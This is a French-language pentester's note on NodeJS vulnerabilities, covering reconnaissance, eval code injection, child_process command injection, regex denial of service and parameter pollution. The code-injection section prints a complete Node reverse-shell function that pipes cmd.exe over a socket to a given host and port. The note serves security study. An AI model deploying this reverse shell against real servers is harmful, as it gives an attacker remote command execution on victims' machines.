# Vulnérabilités NodeJS

## Présentation
NodeJS est un langage basé sur javascript côté serveur basé sur un système d'évènements qui n'est pas bloquant pour les E/S ce qui lui permet d'être une bonne solution pour les contextes à gros volumes de données. 

Il fonctionne en monothread, ce qui peut être très dommageable en cas de DoS.

Une des stack les plus répandues avec NodeJS est une base de donnée NoSQL MongoDB, le framework Express qui est minimaliste mais robuste et facilite grandement le travail des développeurs pour le web et le mobile, et le moteur de template Pug.

En ce qui concenrne le système de packages, NodeJS dispo du plus grand système au monde avec près d'un demi millions de paquets : NPM.

NodeJS ne déroge pas à la règle du web, il est vulnérable sur les entrées utilisateurs non sécurisées. Avec Node il est important de savoir ce que l'on cherche et oùu on le cherche.

## Reconnaissance spécifique
Pour la reconnaissance spécifique à Node, il faut regarder:
* les cookies `connect.sid`
* les entêtes serveurs et `X-powered-By` qui vont nous permettrent d'identifier le framework utilisé (par exemple Express)

Il est également possible d'analyser le code de façon statique à l'aide d'un scanner tel que [NodeJsScan](https://github.com/ajinabraham/NodeJsScan) afin de chercher des vulnérabilités (à travers notamment des fonctions dont les entrées utilisateurs sont non testées).

## Exploitation
### Server Side Code Injection
Node est vunléralbe à l'injection de code à travers la fonction `eval()`. Il ne faut ainsi utiliser les entrées utilisateurs sans les avoir testées. Il ne faut surtout pas les passer directement à des fonctions comme `setTimeOut()` ou `setInterval()`. 

Voici un exemple de code permettant d'obtenir un reverse shell avec NodeJS:


    function rev(host,port){
        var net = require(“net”);
        var cp = require(“child_process”);
        var cmd = cp.spawn(“cmd.exe”, []);
        var client = new net.Socket();
        client.connect(port, host, function(){
            client.write(“Connected\r\n”);

            client.pipe(cmd.stdin);

            cmd.stdout.pipe(client);

            cmd.stderr.pipe(client);

            client.on(‘exit’,function(code,signal){

                client.end(“Disconnected\r\n”);

            });

            client.on(‘error’,function(e){

                setTimeout(rev(host,port),5000);

            })

        });

        return /a/;

    };rev(“127.0.0.1”,4444);

### System Command Injection
NodeJS est vulnérable aux injections de commandes à travers l'utilisation du module `child_process` et notamment la fonction `exec`. Son utilisation sans test de l'entré utilisateur créé un point d'entrée pour l'attaquant.

### Regex DOS
Il est possible de faire crashé une webapp Node avec les regex si nous ne contrôlons pas les entrées utilisateurs. Si une regex attendues défini le début et la fin de l'expression attendu, si au lieu de donner la fin, l'expression reprend le caractère du début de nombreuses fois sans jamais envoyer le caractère de fin, le temps d'exécution va finir par exploser et le service par crashé.

### HTTP Parameter Pollution
Node permet de définir dans une URL plusieurs fois le même paramètres avec plusieurs valeurs différentes. Cela peut être utilisé pour pollué une applicatin qui attendrait un mail pour envoyr quelquechose par exemple.

## voir peter kim sur le rce p109

## Liens 
* https://resources.infosecinstitute.com/penetration-testing-node-js-applications-part-1/#gref
* https://resources.infosecinstitute.com/penetration-testing-node-js-applications-part-2/#gref
